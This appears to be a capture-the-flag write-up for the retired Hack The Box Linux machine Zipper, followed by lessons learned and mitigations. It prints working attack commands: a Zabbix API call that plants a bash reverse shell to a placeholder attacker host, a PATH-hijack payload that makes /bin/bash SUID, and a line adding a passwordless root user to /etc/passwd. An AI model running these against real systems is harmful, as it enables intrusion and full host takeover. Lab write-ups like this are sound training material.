---
machine: Zipper
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, zabbix, api, command-injection, suid, privesc]
---

# Zipper — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Zabbix Agent on 10050 and the web UI allow guessing `zapper:zapper`. The Zabbix API can create a script and run it on the agent, yielding a `zabbix` shell. For root, a SUID binary calls `system` without an absolute path and allows a PATH hijack; alternatively, the backup systemd service is writable and runs as root.

## Recon

```bash
nmap -Pn -sCV -p22,80,10050 <IP>
```

- `22` SSH, `80` Apache with Zabbix and `10050` the agent.
- The UI shows reports and the name of `zapper`'s backup script.
- Login accepts `zapper:zapper` even though the GUI is disabled.

## Enumeration

- `/zabbix/api_jsonrpc.php` authenticates `zapper`.
- `user.login` returns a token and `script.get` lists existing scripts.
- `script.create` defines a command with `execute_on: 0` for the agent.

## Foothold

Create a script with a reverse shell and run it on the agent host; the shell runs as `zabbix`.

```bash
curl -s -X POST 'http://<IP>/zabbix/api_jsonrpc.php' -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"script.create","params":{"name":"pwn","command":"bash -c \\"bash -i >& /dev/tcp/<ATTACKER>/443 0>&1\\"","execute_on":0},"auth":"<TOKEN>","id":1}'
```

## Lateral movement

Local enumeration shows `/home/zapper/utils/zabbix-service`, a SUID binary calling `system("systemctl ...")` without an absolute path, and `/etc/systemd/system/purge-backups.service`, writable by `zapper` and run as root every five minutes.

```bash
find / -perm -4000 -type f 2>/dev/null
ls -l /home/zapper/utils/zabbix-service /etc/systemd/system/purge-backups.*
```

## Privilege escalation

The first path is a PATH hijack: place a fake `systemctl` in `/tmp` and run the SUID.

```bash
export PATH=/tmp:$PATH
printf '#!/bin/bash\nchmod +s /bin/bash\n' > /tmp/systemctl && chmod +x /tmp/systemctl
/home/zapper/utils/zabbix-service
/bin/bash -p
```

The second path modifies the writable service's `ExecStart` to create a root user or add a key; the timer runs it on the next cycle.

```bash
printf '[Service]\nExecStart=/bin/bash -c "echo pwn::0:0::/root:/bin/bash >> /etc/passwd"\n' > /etc/systemd/system/purge-backups.service
```

## Evidence

- `zapper:zapper` and API token.
- Created script and `zabbix` shell.
- SUID `zabbix-service` and writable `purge-backups.service`.
- PATH hijack or cron and root.

## Lessons learned

- A username-as-password can expose the API even when the GUI is blocked.
- The Zabbix API can run commands on agents.
- A SUID calling `system` without an absolute path is trivial escalation.

## Mitigation and detection

- Change default credentials and restrict the API.
- Limit `execute_on` and Zabbix scripts.
- Use absolute paths and read-only permissions in root scripts.

## References

- [0xdf — Zipper](https://0xdf.gitlab.io/2019/02/23/htb-zipper.html)
- [IppSec — Zipper](https://www.youtube.com/watch?v=RLvFwiDK_F8)
- [Hack The Box — Zipper](https://app.hackthebox.com/machines/zipper)
